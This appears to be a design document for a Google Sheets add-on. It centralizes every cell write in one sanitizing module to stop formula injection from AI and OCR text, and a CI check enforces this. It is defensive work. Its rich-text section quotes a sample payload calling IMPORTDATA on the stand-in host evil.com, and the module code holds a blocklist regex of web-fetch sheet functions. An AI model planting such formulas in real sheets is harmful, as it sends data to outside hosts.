# T6 Systemic Fix — Centralized Safe-Write Module

**Linear:** [AI-89](https://linear.app/propublica/issue/AI-89/systemic-fix-for-t6-formula-injection-via-untrusted-cell-writes) (umbrella), children [AI-56](https://linear.app/propublica/issue/AI-56) (done, superseded), [AI-75](https://linear.app/propublica/issue/AI-75), [AI-76](https://linear.app/propublica/issue/AI-76)

## Problem

T6 (formula injection via untrusted cell writes) has been fixed as point-fixes three times: AI-56/PR#112 wired `sanitizeForCell()` into one `setValue()` call in `runBatchAI`. AI-75 and AI-76 each patch one more site that turned out to bypass it. Auditing every `setValue`/`setValues`/`setRichTextValue`/`setRichTextValues` call in `src/server/` for this design surfaced two more gaps beyond AI-75/AI-76, plus a class of bug (re-writing already-sanitized content) that a point-fix approach structurally cannot catch. Point-fixing a fourth and fifth time doesn't address why this keeps recurring: sanitization today is *opt-in* per call site, and nothing stops a new call site from being added without it.

## T6 Redefinition

**Old framing:** "AI-generated text written via `setValue()` may contain a formula."

**New framing:** T6 applies to any Apps Script function whose contract writes content to a cell that the acting user did not directly and knowingly type into that specific cell. Six functions currently do this:

| Function | What it writes | Why it's in scope |
| --- | --- | --- |
| `runBatchAI` | AI-generated text (plain, markdown, grounding markdown) | Model output, not user-composed |
| `extractText` | Drive document/OCR text | Untrusted document content |
| `formatMarkdownSelection` | Re-parses and rewrites the *existing* content of a selected range | Operates on whatever's already in the cell, including prior AI/Extract-Text output |
| `sampleRowsToEvaluation` | Bulk-copies existing cell content into a new `_evaluation` sheet | Same re-write concern, at bulk scale |
| `writeColumn` / `findOrCreateColumn` | Shared write primitives used by `importDriveLinks` and `prepRecipe` | A recipe form-field value is typed into a *form field*, not a cell — it never passes through Sheets' own per-keystroke apostrophe-escaping convention before our code writes it into a cell |

This is not about whether today's callers happen to pass provably-untrusted content — it's about which functions' write path *could* be hijacked, now or by a future caller, without a human ever getting the chance to consciously accept the risk the way they would typing a formula directly into a cell.

**Included, per "sanitize every write, no exceptions" (see Architecture below): the Gemini grounding-markdown write** (`groundingToMarkdown`, used in `runBatchAI`'s grounding-column branch). Worth noting for context: every branch of `groundingToMarkdown` wraps variable/attacker-influenceable content (citation titles, URLs, search queries) behind a fixed literal prefix — `"Sources (N):\n..."`, `"Search queries: ..."`, `"Code (lang):\n..."`. Because `sanitizeForCell()`'s check only inspects the *first character* of the assembled string, and that first character is always one of these fixed prefixes, this specific call site could never produce a formula-triggering leading character regardless of grounding-source content — so on its own it wouldn't need a guard. But per the blanket-sanitization decision, it is routed through `writeSafeRichText` like every other write anyway, rather than carved out as a proven-safe exception. (It remains a live T18 concern — hyperlink scheme allow-listing and citation-title escaping — unaffected by this analysis.)

**Accepted residual risk (documented, not mitigated in-app):** a human user manually copy-pasting (Ctrl+C/Ctrl+V, paste-special-values, drag-fill) an already-neutralized cell's content into a new cell via the Sheets UI. No Apps Script code or trigger runs before or during a native clipboard paste — there's nothing in this add-on's control to intercept. This is consistent with the existing T6 note that user-authored formulas are out of scope; the difference here is the user may not realize a literal-looking string in an AI-output column is a neutralized formula. No in-app UI warning is added for this iteration — documented as an accepted risk only.

## Architecture

### Decision: sanitize every write, unconditionally

Two possible policies were considered:

1. **Selective** — only guard call sites where a concrete, traceable data flow from untrusted origin reaches the write.
2. **Blanket** — every write of this kind goes through the same guard, regardless of whether today's specific callers are provably safe.

**Decision: blanket.** Reasoning:

- **Track record.** The selective approach has already been tried three times on this exact codebase and missed something each time (AI-56 → AI-75/AI-76 → two more found in this audit). "Trace the data flow, guard only what's reachable" is not a one-time cost — it has to be correctly re-derived by every future contributor touching any of these functions, and it's failed repeatedly already with people actively looking for it.
- **Reachability isn't locally verifiable.** `writeColumn`'s safety today depends on an invariant that lives entirely in its *callers* (today: journalist-typed form fields, Drive's own fixed URL format) — nothing in `writeColumn`'s own code enforces or documents that constraint. A future `FillStrategy` that seeds a column from Extract Text output would silently break it.
- **The cost of blanket guarding is ~zero here.** Every current write site uses `setValue`/`setValues`/`setRichTextValue`/`setRichTextValues` — methods whose purpose in all four tools is "display this content," not "deliberately produce a live formula." Apps Script has a distinct, separate API for intentional formula-writing (`Range.setFormula()`/`setFormulas()`), unused anywhere in this codebase. Guarding the four value-writing methods forecloses nothing currently planned; a future feature that genuinely wants to write a live formula would use `setFormula()` and get its own threat analysis at that time.
- **Keeps CI enforcement mechanical.** "No raw call to these four methods outside `safe-writes.ts`" is a rule with zero exceptions — trivial to state, trivial to enforce, trivial to understand. A rule with exceptions ("...unless you've proven this specific call site is unreachable") reopens exactly the judgment call that's produced four missed bugs so far.

### The `'` prefix is a correctness guarantee, not (only) a security control

For content that starts with `=`/`+`/`-` but contains no web-fetch call (e.g. `=SUM(A1:A10)`), `sanitizeForCell()` prefixes it with `'` rather than rejecting it. This is not primarily about preventing computation — a pure-compute formula can't exfiltrate data by itself. It's about **correctness**: without the prefix, any AI response or extracted text that happens to start with a trigger character for entirely innocent reasons ("-12% decline," a document that literally contains "=SUM(...)" as instructional text) would be silently reinterpreted by Sheets as a formula instead of displayed as the literal content it is — best case a parse error, worst case a nonsensical computed value with no indication anything went wrong. It has a secondary defense-in-depth benefit too: the web-fetch function list is a manually maintained blocklist, and "block known-bad, don't let anything else execute live either" doesn't depend on that blocklist staying complete forever.

### Module: `src/server/safe-writes.ts`

A new file, not an extension of `utils.ts`. `utils.ts`'s existing docstring already distinguishes "functions that accept GAS objects as parameters" from "functions with no GAS dependency" — this is a different kind of boundary: a security-enforcement choke point, not a small helper. Giving it its own file makes the invariant ("every cell write goes through here") visible on its own and gives the CI check a single, obviously-named target. `sanitizeForCell()`, `writeColumn()`, and `findOrCreateColumn()` move here from `utils.ts`; `markAIOutputRange()` and `resolveGroundingUris()` stay in `utils.ts` (they don't write cell *values* — background color, notes, and citation-URI resolution aren't part of this threat surface).

Four primitives, one shared security decision:

```ts
// src/server/safe-writes.ts
type Range = GoogleAppsScript.Spreadsheet.Range;
type RichTextValue = GoogleAppsScript.Spreadsheet.RichTextValue;

const WEB_FETCH_PATTERN = /\b(image|importdata|importxml|importhtml|importrange|importfeed)\s*\(/i;

/** The one place formula-injection logic lives. Returns `value` unchanged if safe. */
export function sanitizeForCell(value: string): string {
  if (!value.length || !/^[=+-]/.test(value[0])) return value;
  if (WEB_FETCH_PATTERN.test(value)) {
    return "[SSI Error: AI response contained an external request formula — output rejected]";
  }
  return `'${value}`;
}

/** Rich-text counterpart: safe if sanitizeForCell leaves the flattened text untouched;
 *  otherwise formatting is dropped and the sanitized text becomes plain content. */
function sanitizeRichTextValue(cell: RichTextValue): RichTextValue {
  const text = cell.getText();
  const sanitized = sanitizeForCell(text);
  return sanitized === text ? cell : SpreadsheetApp.newRichTextValue().setText(sanitized).build();
}

// Plain cell values can be any GAS type (string, number, boolean, Date) — a
// non-string can never be a sheet function, so it passes through untouched.
// Needed because sampleRowsToEvaluation copies raw, mixed-type getValues()
// output, not just AI/extraction strings. RichTextValue has no equivalent
// gate because it is always text by construction (see sanitizeRichTextValue).

export function writeSafeValue(range: Range, value: unknown): void {
  range.setValue(typeof value === "string" ? sanitizeForCell(value) : value);
}

export function writeSafeValueGrid(range: Range, values: unknown[][]): void {
  range.setValues(
    values.map((row) => row.map((v) => (typeof v === "string" ? sanitizeForCell(v) : v))),
  );
}

export function writeSafeRichText(range: Range, richTextValue: RichTextValue): void {
  range.setRichTextValue(sanitizeRichTextValue(richTextValue));
}

export function writeSafeRichTextGrid(range: Range, grid: RichTextValue[][]): void {
  range.setRichTextValues(grid.map((row) => row.map(sanitizeRichTextValue)));
}
```

`writeColumn()` and `findOrCreateColumn()` become thin callers of these primitives (a column write is a grid write shaped `values.map(v => [v])`; a header-title write is a single `writeSafeValue` call) rather than having their own separate sanitize-then-`setValues` logic.

#### Why rich-text sanitization must operate on the *post-markdown-parsed* text

`writeSafeRichText`/`writeSafeRichTextGrid` take the already-built `RichTextValue` (built by the existing `toCellValue(parseMarkdown(...))` pipeline in `index.ts`, unchanged) and call `.getText()` to get the flattened text to check — never the raw pre-parsed markdown source. This matters concretely: a prompt-injected response like `"**=IMPORTDATA(\"evil.com\")**"` has a raw string starting with `*`, not `=` — sanitizing the raw source would miss it. `parseMarkdown` strips the `**` delimiters, and the *actual stored/displayed text* — what `RichTextValue.getText()` returns — starts with `=`. The web-fetch pattern check has the same issue in reverse: `**IMPORTDATA**("evil.com")` in the raw source breaks the regex's adjacency match (`**` sits between the function name and its paren), but the flattened, markdown-stripped text has `IMPORTDATA(` directly adjacent again. Sanitizing anything other than the exact string that will be stored is unsound.

**Empirically verified** (2026-07-15, dev sheet, via `Range.setRichTextValue()` with text `"=1+1"`): `getDisplayValue()` returned `"2"` and `getFormula()` returned `"=1+1"` — confirming `setRichTextValue()` evaluates a leading formula-trigger character exactly like `setValue()` does. This was checked rather than assumed, since the existing threat model's claim to this effect predates this design and hadn't been independently re-verified.

`writeSafeRichTextGrid` sanitizes **every** cell in the incoming grid uniformly — including cells `formatMarkdownSelection` passes through unchanged (its existing logic already returns a cell's pre-existing `RichTextValue` untouched when that cell wasn't re-parsed). This keeps `formatMarkdownSelection` itself simple (it only decides *what* markdown-formatted content to write; sanitization isn't its concern) and avoids relitigating which grid cells are "provably already safe."

### Enforcement — CI check

A build-time check fails if a raw `.setValue(`, `.setValues(`, `.setRichTextValue(`, or `.setRichTextValues(` call appears anywhere in `src/server/**/*.ts` outside `safe-writes.ts`. Implementation: a grep-based script (e.g. `scripts/check-safe-writes.sh`, wired into `package.json` and `.github/workflows/lint-typecheck-format-test.yml` alongside lint/typecheck/format/test). Exact script mechanics are an implementation detail for the plan, not this design — the requirement is: zero raw calls outside the one file, checked on every push/PR.

## Full Call-Site Inventory

| Site | Today's content source | Primitive |
| --- | --- | --- |
| `extractText` (`index.ts:164`) | OCR/Doc text | `writeSafeValue` |
| `runBatchAI` plain-text branch (`index.ts:551`) | AI response | `writeSafeValue` |
| `runBatchAI` `applyMarkdown` branch (`index.ts:546`, catch-fallback `548`) | AI response, rich text | `writeSafeRichText` (try/catch around markdown *parsing* exceptions is preserved — unrelated to sanitization) |
| `runBatchAI` grounding column (`index.ts:559`) | Grounding markdown, rich text | `writeSafeRichText` (structurally safe already — routed through for uniformity) |
| `runBatchAI` `directWrites` loop (`index.ts:565`) | Our own constructed `[File error: ...]` string | `writeSafeValue` (structurally safe already — routed through for uniformity) |
| `formatMarkdownSelection` (`index.ts:291`) | Re-parsed existing cell content, grid | `writeSafeRichTextGrid` |
| `sampleRowsToEvaluation` header copy (`index.ts:221`) | Existing header row, grid | `writeSafeValueGrid` |
| `sampleRowsToEvaluation` data copy (`index.ts:230`) | Existing row data (mixed types), grid | `writeSafeValueGrid` |
| `writeColumn` (internal, used by `importDriveLinks`, `prepRecipe`) | Drive URLs / recipe form-field values | `writeSafeValueGrid` |
| `findOrCreateColumn` header-title write (internal) | Column title (RPC-supplied) | `writeSafeValue` |
| `SSI()` custom function return (`customFunctions.ts`) | AI response | **N/A — not a T6 vector.** Custom function (`@customfunction`) return values are displayed as literal computed output and are never re-parsed as a new formula by Sheets, regardless of content. No change. |

Zero raw `setValue`/`setValues`/`setRichTextValue`/`setRichTextValues` calls remain in `index.ts` after this change.

## Threat Model Updates (`docs/threat_models/ssi-toolkit-threat-model.md`)

- Rewrite T6's description per "T6 Redefinition" above.
- Add response **R45**: centralized safe-write module, CI-enforced, applied unconditionally; supersedes R8, R21, R22.
- Mark R8, R21, R22 as "Superseded by R45 — see AI-89" (matching the existing R18→R44 precedent).
- Replace the three separate AI-56/AI-75/AI-76 Open Items rows with one row: "Systemic fix for T6" under AI-89, listing the full call-site set, status Open until merged.
- No changes to T18 (grounding hyperlink/citation-title concerns are unaffected and separately tracked via R30/R31/R36).

## Testing

- New `__tests__/safe-writes.test.ts`: migrate existing `sanitizeForCell` tests from `utils.test.ts`; add tests for `sanitizeRichTextValue`/`writeSafeRichText`/`writeSafeRichTextGrid` using duck-typed fakes (a fake `RichTextValue` with a controllable `.getText()`, consistent with the existing no-globalThis-mocking pattern in this codebase); add tests for `writeSafeValueGrid`'s mixed-type (`unknown[][]`) handling — confirm numbers/booleans/dates pass through untouched and only strings are sanitized.
- Update `extractText`, `runBatchAI`, `formatMarkdownSelection`, `sampleRowsToEvaluation`, `prepRecipe`, `importDriveLinks` tests to assert the safe-write primitives are used (dangerous content is neutralized end-to-end) rather than asserting `sanitizeForCell` is called directly.
- Manually verify the CI check during implementation: temporarily reintroduce a raw `setValue()` call outside `safe-writes.ts`, confirm the check fails, then remove it.

## Out of Scope

- T18 (hyperlink scheme allow-listing, citation-title escaping) — untouched by this work, tracked separately via R30/R31/R36.
- An in-app UI warning about the manual copy-paste residual risk — documented only, per discussion above.
- A reactive `onEdit`-based scanner for manually-typed/pasted content — considered and rejected as meaningfully larger scope (runs on every edit, simple-trigger authorization limits, perf/UX trade-offs) with no clear ask for it in this iteration.
